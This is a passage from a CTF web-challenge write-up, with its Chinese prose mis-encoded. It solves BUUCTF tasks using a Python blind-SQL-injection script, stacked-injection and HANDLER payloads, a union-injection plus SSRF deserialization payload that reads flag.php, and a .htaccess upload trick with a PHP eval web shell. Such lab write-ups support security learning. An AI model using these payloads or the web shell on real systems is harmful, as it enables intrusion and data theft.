punctuation\">{<!-- --></span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Error: %s\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">mysqli_error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$con</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n\t\t<span class=\"token comment\">// echo '&lt;pre&gt;';</span>\n\t\t<span class=\"token variable\">$arr</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_fetch_row</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token comment\">// print_r($arr);</span>\n\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arr</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$arr</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n\t\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">}</span>\n\t\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n\t\t\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"wrong pass!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n\t\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"wrong user!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>ä¸‹é¢ä»£ç è¿‡æ»¤äº†<code>/\\(|\\)|\\=|or/</code>å­—ç¬¦</p>\n<pre><code class=\"prism language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\(|\\)|\\=|or/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"do not hack me!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>è¿™é‡Œè¡¨ç¤ºpasswordè¿›è¡Œäº†md5åŠ å¯†ï¼Œä¸”ç”¨æˆ·å¿…é¡»æ˜¯admin</p>\n<pre><code class=\"prism language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arr</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$arr</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n\t\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">}</span>\n</code></pre>\n<h1><a id=\"CISCN2019__Day2_Web1Hack_World_1429\"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h1>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\dea52f60945e4329b0133d7a1bef20d2.png\"/></p>\n<p>æ˜¾ç¤ºäº†ä¸€äº›å¸¸è§çš„SQLå­—ç¬¦ï¼Œå¾ˆå¤šéƒ½è¢«è¿‡æ»¤äº†<br/> ä½†è¿˜æœ‰<code>()</code>å­—ç¬¦æ²¡è¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬ä½¿ç”¨<code>()</code>ä»£æ›¿ç©ºæ ¼ï¼Œè€Œä¸”é¢˜ç›®æç¤ºflagåœ¨flagè¡¨çš„flagå­—æ®µä¸­<br/> è¿™é‡Œä½¿ç”¨è„šæœ¬çˆ†ç ´</p>\n<pre><code class=\"prism language-python\"><span class=\"token comment\"># -*- coding:utf-8 -*-</span>\n<span class=\"token comment\"># Author: mochu7</span>\n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> string\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">blind_injection</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tflag <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n\tstrings <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>printable\n\t<span class=\"token keyword\">for</span> num <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\t\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> strings<span class=\"token punctuation\">:</span>\n\t\t\tpayload <span class=\"token operator\">=</span> <span class=\"token string\">'(select(ascii(mid(flag,{0},1))={1})from(flag))'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">,</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#formatå‡½æ•°è®¾ç½®æŒ‡å®šä½ç½®{0}{1}</span>\n\t\t\tpost_data <span class=\"token operator\">=</span> <span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span>payload<span class=\"token punctuation\">}</span>\n\t\t\tres <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>post_data<span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token keyword\">if</span> <span class=\"token string\">'Hello'</span> <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n\t\t\t\tflag <span class=\"token operator\">+=</span> i\n\t\t\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">':'</span><span class=\"token operator\">+</span>flag<span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n\t\t\t\t<span class=\"token keyword\">continue</span>\n\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n\turl <span class=\"token operator\">=</span> <span class=\"token string\">'http://f22f114e-13f7-4f18-8877-3429e32adcbd.node4.buuoj.cn:81/index.php'</span>\n\tblind_injection<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span>\n\n\n</code></pre>\n<p>è¿™é‡Œæœ‰çš„å­—ç¬¦å› æ—¶é—´è¿‡é•¿å¯èƒ½ä¼šè·³è¿‡ï¼Œå¤šæ‰§è¡Œå‡ æ¬¡ç´¯åŠ èµ·æ¥å³å¯</p>\n<h1><a id=\"GYCTF2020Blacklist_1465\"></a>[GYCTF2020]Blacklist</h1>\n<p><strong>é¢˜ç›®ç±»å‹ï¼šå †å æ³¨å…¥+HANDLER</strong><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\994fd714107a4c91a993f40f1168cd7b.png\"/><br/> <code>1';show databases;#</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\40d7f7c8db3e4276958dc1c0ca6d24e1.png\"/><br/> <code>1';show tables;#</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\a0d4860b59d847358b155ccbb765824b.png\"/><br/> <code>1'; show columns from FlagHere;#</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\b52a52330a6b499e989a215ffa160ae4.png\"/><br/> å‘ç°è¿™é‡Œæœ‰ä¸€äº›è¿‡æ»¤<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\21b4819437214462a54cd3d5162a3dbe.png\"/><br/> ç„¶åæˆ‘å°±æ²¡æ€è·¯äº†ï¼Œè®°å¾—è·Ÿ <strong>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</strong> å·®ä¸å¤šï¼Œä½†è¿™ä¸ªè¿‡æ»¤çš„æ›´ä¸¥</p>\n<p>ä¸‹é¢æ˜¯å­¦ä¹ å¤§ä½¬çš„æ–¹æ³•ï¼š</p>\n<p><code>HANDLER OPEN</code>è¯­å¥æ‰“å¼€ä¸€ä¸ªè¡¨ï¼Œä½¿å…¶å¯ä»¥ä½¿ç”¨åç»­<code>HANDLER READ</code>è¯­å¥è®¿é—®ï¼Œè¯¥è¡¨å¯¹è±¡æœªè¢«å…¶ä»–ä¼šè¯å…±äº«ï¼Œå¹¶ä¸”åœ¨ä¼šè¯è°ƒç”¨<code>HANDLER CLOSE</code>æˆ–ä¼šè¯ç»ˆæ­¢ä¹‹å‰ä¸ä¼šå…³é—­<br/> <code>1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\189ecbbf62b848a28161c2b61469bb05.png\"/></p>\n<h1><a id=\"_2018Fakebook_1483\"></a>[ç½‘é¼æ¯ 2018]Fakebook</h1>\n<p><strong>é¢˜ç›®ç±»å‹ï¼šsql+ssrf+åºåˆ—åŒ–+ä»£ç å®¡è®¡</strong><br/> åƒè¿™ç§blogçŒœæµ‹åº”è¯¥æ˜¯xssæ¼æ´<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\a1c64eb77cc844d8a61c614e89e48a9d.png\"/></p>\n<p>ç‚¹å‡»joinï¼Œå…ˆè¯•äº†ä¸€ä¸‹xss<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\dd641adc15b6493cb34d7770953b502f.png\"/><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\b45d12ae54824765b86deed52b56e47e.png\"/><br/> æŠ“åŒ…çœ‹çœ‹<img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\be17626f00d14207adf53569ece6c581.png\"/>æ²¡ä»€ä¹ˆæ€è·¯</p>\n<p>æŸ¥çœ‹å¤§ä½¬åšå®¢å‘ç°ï¼Œblogæ˜¯æœ‰é™åˆ¶çš„ï¼Œå¿…é¡»httpå¼€å¤´<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\138ffc6de33e47bc9f7ad22299315cba.png\"/>ç„¶åå‘ç°usernameå¤„æ˜¯ä¸ªé“¾æ¥ï¼Œç‚¹è¿›å»<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\e9fed046579b4a25b0ecfa245b55ed77.png\"/>URLé‡Œæœ‰ä¸ªå‚æ•°noï¼Œä½¿<code>no=0</code>è¯•ä¸€è¯•<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\68b15a56311041e3a29eafb90af9d9e8.png\"/><br/> æ²¡æœ‰ä»€ä¹ˆæ–°å‘ç°<br/> å°è¯•çœ‹çœ‹æœ‰æ²¡æœ‰SQLæ³¨å…¥æ¼æ´ï¼Œä½¿<code>no=1'</code><br/> æŠ¥é”™äº†ï¼ŒSQLè¯­æ³•é”™è¯¯ï¼Œè¯´æ˜è¿™æ˜¯ä¸ªæ•°å­—å‹çš„sqlæ³¨å…¥</p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\9e74bad619314a09a72071cd2f43dc34.png\"/><br/> ç»è¿‡å°è¯•ï¼Œå‘ç°unionè¢«è¿‡æ»¤ï¼Œè¿™é‡Œç©ºæ ¼ç”¨<code>/**/</code>ä»£æ›¿ï¼Œæ„é€ <code>?no=0/**/union/**/select/**/1,2,3,4#</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\d676c49132584c56bfdad1f4ef39fbbc.png\"/><br/> ä»æŠ¥é”™ä¿¡æ¯æ¥çœ‹ï¼Œå›æ˜¾ä½ç½®æ˜¯2ï¼Œè€Œä¸”è¿™é‡Œçš„æ•°æ®éƒ½è¢«è¿›è¡Œäº†åºåˆ—åŒ–ï¼Œçˆ†å‡ºè·¯å¾„<code>/var/www/html</code></p>\n<p>ä½¿ç”¨dirsearchæ‰«æç›®å½•ï¼Œå‘ç°<code>user.php.bak</code>ï¼Œè®¿é—®ï¼Œå‡ºç°æºç </p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">UserInfo</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$blog</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$blog</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">age</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">int</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">blog</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$blog</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$ch</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_URL</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_RETURNTRANSFER</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$output</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$httpCode</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_getinfo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLINFO_HTTP_CODE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$httpCode</span> <span class=\"token operator\">==</span> <span class=\"token number\">404</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">return</span> <span class=\"token number\">404</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token function\">curl_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$output</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">getBlogContents </span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">blog</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">isValidBlog </span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$blog</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">blog</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$blog</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>ä»£ç å®¡è®¡ï¼šgetå‡½æ•°ä¸­æœ‰å‡ºç°<code>curl_exec()</code>ï¼Œå­˜åœ¨ssrfï¼Œä¸”æ²¡æœ‰è¿‡æ»¤ã€‚curlå¯ç”¨fileåè®®ï¼Œblogå±æ€§è°ƒç”¨äº†getå‡½æ•°ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨fileåè®®è¯»å–æ–‡ä»¶ã€‚<code>file:///var/www/html/flag.php</code></p>\n<p>æ‰€ä»¥æˆ‘ä»¬å…ˆç¼–å†™è„šæœ¬è¿›è¡Œåºåˆ—åŒ–</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">UserInfo</span><span class=\"token punctuation\">{<!-- --></span>\n\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$blog</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"file:///var/www/html/flag.php\"</span><span class=\"token punctuation\">;</span>\t\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$obj</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">UserInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$obj</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\a0ce90bb76294bc0be8ae61048f5d75e.png\"/></p>\n<p>æ„é€ payloadï¼š<code>?no=0/**/union/**/select/**/1,2,3,'O:8:\"UserInfo\":3:{s:4:\"name\";s:1:\"1\";s:3:\"age\";i:0;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}'</code><br/> ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://img-blog.csdnimg.cn/f0c62715328b499bbb4a190660a07885.png?x-oss-process=image<img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\95fdbef06e8841778f03a1415d622cad.png\"/>flag.phpæ–‡ä»¶çš„å†…å®¹å‡ºç°åœ¨iframeä¸­ï¼ŒF12æŸ¥çœ‹<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\38ed30bd6ba0436eaf44569cedd634cb.png\"/></p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\94199d2a1b1d4953b296f5cd6d697034.png\"/>æ‹¿åˆ°flag~~</p>\n<h1><a id=\"GXYCTF2019BabyUpload_1576\"></a>[GXYCTF2019]BabyUpload</h1>\n<p><strong>é¢˜ç›®ç±»å‹</strong>ï¼šå›¾ç‰‡é©¬+é€šè¿‡é…ç½®æ–‡ä»¶æ„é€ PHPåé—¨</p>\n<p>éšä¾¿ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œéƒ½æç¤ºä¸Šä¼ å¤±è´¥ï¼ŒçŒœæµ‹æ˜¯è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ï¼Œåœ¨å‰é¢çš„<a href=\"https://blog.csdn.net/m0_52923241/article/details/119751029?spm=1001.2014.3001.5501\">[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</a>ä¸­æœ‰æåˆ°ä¸€äº›æ–¹æ³•ï¼Œæˆ‘ä»¬å…ˆè¯•ç€ä¸Šä¼ ä¸€ä¸ª<code>.htaccess</code>æ–‡ä»¶</p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">&lt;</span>FilesMatch <span class=\"token string double-quoted-string\">\"a.jpeg\"</span><span class=\"token operator\">&gt;</span>\nSetHandler application<span class=\"token operator\">/</span>x<span class=\"token operator\">-</span>httpd<span class=\"token operator\">-</span>php\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>FilesMatch<span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>ç‚¹å‡»ä¸Šä¼ æ—¶ç”¨burpæŠ“åŒ…ï¼Œä¿®æ”¹Content-Typeä¸ºï¼š<code>image/jpeg</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\c8f5c56d9eaa4b2f91fc6bfa415bf6a8.png\"/>ä¸Šä¼ æˆåŠŸ</p>\n<p>å†ç»§ç»­ä¸Šä¼ å›¾ç‰‡é©¬<code>&lt;?php @eval($_POST['a']);?&gt;</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\5a121bd48ee143b094872bf98ef57bfe.png\"/>èšå‰‘é“¾æ¥,æ‹¿åˆ°flag~~</p>\n<p>æŸ¥çœ‹æºç </p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\" /&gt; \n&lt;title&gt;Upload&lt;/title&gt;\n&lt;form action=\\\"\\\" method=\\\"post\\\" enctype=\\\"multipart/form-data\\\"&gt;\nä¸Šä¼ æ–‡ä»¶&lt;input type=\\\"file\\\" name=\\\"uploaded\\\" /&gt;\n&lt;input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"ä¸Šä¼ \\\" /&gt;\n&lt;/form&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uploaded'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$target_path</span>  <span class=\"token operator\">=</span> <span class=\"token function\">getcwd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"/upload/\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$t_path</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$target_path</span> <span class=\"token operator\">.</span> <span class=\"token string 